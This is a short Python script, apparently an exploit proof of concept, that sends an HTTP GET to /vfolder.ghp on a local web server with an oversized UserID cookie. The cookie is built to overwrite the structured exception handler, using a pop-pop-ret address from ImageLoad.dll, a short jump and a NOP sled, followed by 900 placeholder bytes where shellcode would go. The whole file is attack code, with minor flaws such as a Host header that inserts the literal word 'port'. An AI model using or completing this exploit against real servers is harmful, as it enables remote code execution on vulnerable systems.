import socket
import os
import sys

ip = '127.0.0.1'
port = 80
# nseh = 0x100194bf : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll]

#jump 6 EB06
nseh = "\xbf\x94\x01\x10"
seh = "\x90\x90\xeb\x06"

#nseh = "B"*4
#seh = "C"*4

stuff = "A"*4063 + nseh + seh + "\x90"*40 + "X"*900

buffer =  "GET /vfolder.ghp HTTP/1.1\r\n"
buffer += "User-Agent: Mozilla/5.0\r\n"
buffer += "Host:" + ip + ":" + "port" + "\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-us\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "Referer: http://" + ip + "/\r\n"
buffer += "Cookie: SESSIONID=6771; UserID=" + stuff	+ "; PassWD=;\r\n"
buffer += "Conection: Keep-Alive\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(buffer)
s.close()
